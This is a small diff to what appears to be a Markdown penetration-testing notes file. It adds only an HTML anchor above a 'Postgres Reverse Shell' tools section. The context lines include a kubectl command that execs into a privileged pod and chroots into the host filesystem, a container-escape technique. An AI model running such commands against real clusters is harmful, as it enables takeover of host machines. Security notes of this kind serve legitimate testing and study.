@@ -245,6 +245,7 @@ kubectl run everything-allowed-exec-pod --image=alpine --overrides='
 kubectl exec -it <badpod> -- /bin/sh -c 'chroot /host'
 ```
 # Tools
+<a id="item-seven"></a>
 
 ## Postgres Reverse Shell
 ```go
